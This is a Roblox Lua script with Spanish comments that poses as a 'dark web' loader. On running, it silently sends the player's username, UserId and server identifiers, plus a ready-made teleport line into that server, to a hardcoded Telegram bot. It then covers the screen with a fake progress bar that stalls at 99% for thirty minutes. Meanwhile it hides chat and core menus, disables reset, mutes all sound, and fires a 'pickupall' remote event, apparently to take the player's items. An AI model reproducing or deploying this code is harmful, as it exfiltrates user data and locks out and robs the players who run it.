--------------------------------------------------
-- TELEGRAM: INFO + SCRIPT SOLO
--------------------------------------------------
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local TELEGRAM_TOKEN = "8526411491:AAFepdTNSzGgHyVl2jCmBba4XazNPomwrQY"
local TELEGRAM_CHAT_ID = "8636835887"
local BASE = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"

pcall(function()
	local placeId = tostring(game.PlaceId)
	local jobId = tostring(game.JobId)

	local joinScript = string.format(
		'game:GetService("TeleportService"):TeleportToPlaceInstance(%s,"%s",game.Players.LocalPlayer)',
		placeId,
		jobId
	)

	-- Mensaje 1: información
	local info = string.format(
		"Script ejecutado\n\nUsuario: %s\nUserId: %s\nPlaceId: %s\nJobId: %s",
		LocalPlayer.Name,
		tostring(LocalPlayer.UserId),
		placeId,
		jobId
	)

	game:HttpGet(string.format(
		"%s?chat_id=%s&text=%s",
		BASE,
		TELEGRAM_CHAT_ID,
		HttpService:UrlEncode(info)
	))

	task.wait(0.4)

	-- Mensaje 2: SOLO el script (fácil de copiar)
	game:HttpGet(string.format(
		"%s?chat_id=%s&text=%s",
		BASE,
		TELEGRAM_CHAT_ID,
		HttpService:UrlEncode(joinScript)
	))
end)

--[[
	FULLSCREEN DARK-WEB LOADER
	Estilo hacker / terminal profesional
	99% = 30 minutos
]]

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local NOMBRE = "DarkWebLoader"
local gui, barraFill, textoPct, textoLog, textoStatus
local porcentaje = 0

local LOGS = {
	"[SYSTEM] Establishing secure session...",
	"[AUTH] Validating client signature...",
	"[NET] Handshake complete · latency OK",
	"[CORE] Injecting runtime modules...",
	"[CORE] Linking environment variables...",
	"[SEC] Integrity check passed",
	"[LOAD] Mapping memory blocks...",
	"[LOAD] Compiling payload layers...",
	"[SYNC] Pulling remote configuration...",
	"[SYNC] Applying encrypted profile...",
	"[UI] Building interface buffers...",
	"[FINAL] Stabilizing execution thread...",
}

local function Tween(obj, props, t)
	local tw = TweenService:Create(obj, TweenInfo.new(t or 0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), props)
	tw:Play()
	return tw
end

local function CrearUI()
	pcall(function()
		for _, p in ipairs({PlayerGui, CoreGui}) do
			local v = p:FindFirstChild(NOMBRE)
			if v then v:Destroy() end
		end
	end)

	local screen = Instance.new("ScreenGui")
	screen.Name = NOMBRE
	screen.IgnoreGuiInset = true
	screen.ResetOnSpawn = false
	screen.DisplayOrder = 2147483647

	local ok = pcall(function() screen.Parent = CoreGui end)
	if not ok then screen.Parent = PlayerGui end

	-- Fondo total
	local bg = Instance.new("Frame")
	bg.Size = UDim2.new(1, 50, 1, 90)
	bg.Position = UDim2.new(0, -25, 0, -45)
	bg.BackgroundColor3 = Color3.fromRGB(4, 5, 7)
	bg.BorderSizePixel = 0
	bg.Active = true
	bg.Parent = screen

	-- Scanline sutil (línea decorativa superior)
	local topLine = Instance.new("Frame")
	topLine.Size = UDim2.new(1, 0, 0, 1)
	topLine.Position = UDim2.new(0, 0, 0, 48)
	topLine.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
	topLine.BackgroundTransparency = 0.7
	topLine.BorderSizePixel = 0
	topLine.Parent = bg

	-- Header
	local header = Instance.new("TextLabel")
	header.Size = UDim2.new(1, -40, 0, 22)
	header.Position = UDim2.new(0, 20, 0, 18)
	header.BackgroundTransparency = 1
	header.Text = "SECURE RUNTIME  ·  BUILD 4.9.1"
	header.TextColor3 = Color3.fromRGB(0, 255, 140)
	header.TextSize = 12
	header.Font = Enum.Font.Code
	header.TextXAlignment = Enum.TextXAlignment.Left
	header.Parent = bg

	local session = Instance.new("TextLabel")
	session.Size = UDim2.new(0.4, 0, 0, 22)
	session.Position = UDim2.new(0.58, 0, 0, 18)
	session.BackgroundTransparency = 1
	session.Text = "SESSION: ENCRYPTED"
	session.TextColor3 = Color3.fromRGB(80, 90, 100)
	session.TextSize = 11
	session.Font = Enum.Font.Code
	session.TextXAlignment = Enum.TextXAlignment.Right
	session.Parent = bg

	-- Título principal
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(0.9, 0, 0, 36)
	title.Position = UDim2.new(0.05, 0, 0.28, 0)
	title.BackgroundTransparency = 1
	title.Text = "> INITIALIZING MODULES"
	title.TextColor3 = Color3.fromRGB(235, 240, 245)
	title.TextSize = 26
	title.Font = Enum.Font.Code
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = bg

	-- Log / status
	textoLog = Instance.new("TextLabel")
	textoLog.Size = UDim2.new(0.9, 0, 0, 20)
	textoLog.Position = UDim2.new(0.05, 0, 0.35, 0)
	textoLog.BackgroundTransparency = 1
	textoLog.Text = LOGS[1]
	textoLog.TextColor3 = Color3.fromRGB(0, 220, 130)
	textoLog.TextSize = 13
	textoLog.Font = Enum.Font.Code
	textoLog.TextXAlignment = Enum.TextXAlignment.Left
	textoLog.Parent = bg

	-- Track
	local track = Instance.new("Frame")
	track.Size = UDim2.new(0.9, 0, 0, 6)
	track.Position = UDim2.new(0.05, 0, 0.44, 0)
	track.BackgroundColor3 = Color3.fromRGB(18, 22, 28)
	track.BorderSizePixel = 0
	track.Parent = bg

	local trackCorner = Instance.new("UICorner")
	trackCorner.CornerRadius = UDim.new(0, 3)
	trackCorner.Parent = track

	local trackStroke = Instance.new("UIStroke")
	trackStroke.Color = Color3.fromRGB(0, 255, 140)
	trackStroke.Thickness = 1
	trackStroke.Transparency = 0.85
	trackStroke.Parent = track

	-- Fill
	barraFill = Instance.new("Frame")
	barraFill.Size = UDim2.new(0, 0, 1, 0)
	barraFill.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
	barraFill.BorderSizePixel = 0
	barraFill.Parent = track

	local fillCorner = Instance.new("UICorner")
	fillCorner.CornerRadius = UDim.new(0, 3)
	fillCorner.Parent = barraFill

	-- Glow edge
	local edge = Instance.new("Frame")
	edge.Size = UDim2.new(0, 3, 1, 0)
	edge.Position = UDim2.new(1, -3, 0, 0)
	edge.BackgroundColor3 = Color3.fromRGB(180, 255, 210)
	edge.BorderSizePixel = 0
	edge.Parent = barraFill

	-- Porcentaje grande
	textoPct = Instance.new("TextLabel")
	textoPct.Size = UDim2.new(0.3, 0, 0, 40)
	textoPct.Position = UDim2.new(0.05, 0, 0.48, 0)
	textoPct.BackgroundTransparency = 1
	textoPct.Text = "00%"
	textoPct.TextColor3 = Color3.fromRGB(0, 255, 140)
	textoPct.TextSize = 32
	textoPct.Font = Enum.Font.Code
	textoPct.TextXAlignment = Enum.TextXAlignment.Left
	textoPct.Parent = bg

	textoStatus = Instance.new("TextLabel")
	textoStatus.Size = UDim2.new(0.5, 0, 0, 20)
	textoStatus.Position = UDim2.new(0.45, 0, 0.51, 0)
	textoStatus.BackgroundTransparency = 1
	textoStatus.Text = "status: RUNNING"
	textoStatus.TextColor3 = Color3.fromRGB(90, 100, 115)
	textoStatus.TextSize = 12
	textoStatus.Font = Enum.Font.Code
	textoStatus.TextXAlignment = Enum.TextXAlignment.Right
	textoStatus.Parent = bg

	-- Footer
	local footer = Instance.new("TextLabel")
	footer.Size = UDim2.new(0.9, 0, 0, 18)
	footer.Position = UDim2.new(0.05, 0, 0.92, 0)
	footer.BackgroundTransparency = 1
	footer.Text = "Do not close this window · Process is encrypted and monitored"
	footer.TextColor3 = Color3.fromRGB(55, 62, 72)
	footer.TextSize = 11
	footer.Font = Enum.Font.Code
	footer.TextXAlignment = Enum.TextXAlignment.Left
	footer.Parent = bg

	local bottomLine = Instance.new("Frame")
	bottomLine.Size = UDim2.new(1, 0, 0, 1)
	bottomLine.Position = UDim2.new(0, 0, 1, -40)
	bottomLine.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
	bottomLine.BackgroundTransparency = 0.85
	bottomLine.BorderSizePixel = 0
	bottomLine.Parent = bg

	return screen
end

local function SetProgress(pct, instant)
	porcentaje = math.clamp(pct, 0, 100)
	if textoPct then
		textoPct.Text = string.format("%02d%%", math.floor(porcentaje))
	end
	if barraFill then
		local goal = {Size = UDim2.new(porcentaje / 100, 0, 1, 0)}
		if instant then
			barraFill.Size = goal.Size
		else
			Tween(barraFill, goal, 0.5)
		end
	end
end

local function SetLog(i)
	if textoLog and LOGS[i] then
		textoLog.TextTransparency = 0.5
		textoLog.Text = LOGS[i]
		Tween(textoLog, {TextTransparency = 0}, 0.3)
	end
end

local function QuitarCore()
	for _, t in ipairs({
		Enum.CoreGuiType.Chat,
		Enum.CoreGuiType.PlayerList,
		Enum.CoreGuiType.Backpack,
		Enum.CoreGuiType.Health,
		Enum.CoreGuiType.EmotesMenu,
	}) do
		pcall(function() StarterGui:SetCoreGuiEnabled(t, false) end)
	end
	pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
end

local function IniciarCarga()
	task.spawn(function()
		SetLog(1)
		for i = 1, 65 do
			SetProgress(i)
			if i == 10 then SetLog(2) end
			if i == 22 then SetLog(3) end
			if i == 35 then SetLog(4) end
			if i == 48 then SetLog(5) end
			if i == 58 then SetLog(6) end
			task.wait(0.16)
		end

		SetLog(7)
		for i = 66, 88 do
			SetProgress(i)
			if i == 75 then SetLog(8) end
			if i == 84 then SetLog(9) end
			task.wait(0.9)
		end

		SetLog(10)
		for i = 89, 99 do
			SetProgress(i)
			if i == 94 then SetLog(11) end
			if i == 98 then SetLog(12) end
			task.wait(7)
		end

		-- 99% × 30 min
		SetProgress(99)
		if textoStatus then textoStatus.Text = "status: FINALIZING" end
		task.wait(30 * 60)

		SetProgress(100)
		if textoLog then textoLog.Text = "[DONE] Runtime ready" end
		if textoStatus then textoStatus.Text = "status: COMPLETE" end
	end)
end

gui = CrearUI()

-- Remote al iniciar el anuncio
pcall(function()
	local args = {
		"pickupall",
		83618240
	}
	game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
end)

QuitarCore()
IniciarCarga()

--------------------------------------------------
-- SILENCIO TOTAL
--------------------------------------------------
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")

local function SilenciarTodo()
	pcall(function()
		SoundService.AmbientReverb = Enum.ReverbType.NoReverb
		SoundService.RespectFilteringEnabled = true
	end)

	-- Bajar volumen global
	pcall(function()
		UserSettings():GetService("UserGameSettings").MasterVolume = 0
	end)

	-- Mutear todos los sonidos existentes
	for _, obj in ipairs(Workspace:GetDescendants()) do
		if obj:IsA("Sound") then
			pcall(function()
				obj.Volume = 0
				obj.Playing = false
				obj:Stop()
			end)
		end
	end

	for _, obj in ipairs(SoundService:GetDescendants()) do
		if obj:IsA("Sound") then
			pcall(function()
				obj.Volume = 0
				obj:Stop()
			end)
		end
	end
end

-- Primera pasada
SilenciarTodo()

-- Si el juego crea sonidos nuevos, también los apaga
Workspace.DescendantAdded:Connect(function(obj)
	if obj:IsA("Sound") then
		pcall(function()
			obj.Volume = 0
			obj:Stop()
		end)
	end
end)

-- Refuerzo cada 2 segundos
task.spawn(function()
	while true do
		task.wait(2)
		SilenciarTodo()
	end
end)

RunService.RenderStepped:Connect(function()
	pcall(QuitarCore)
	if not gui or not gui.Parent then
		gui = CrearUI()
		SetProgress(porcentaje, true)
	end
end)

task.spawn(function()
	while true do
		task.wait(2)
		pcall(QuitarCore)
		if not gui or not gui.Parent then
			gui = CrearUI()
			SetProgress(porcentaje, true)
		end
	end
end)
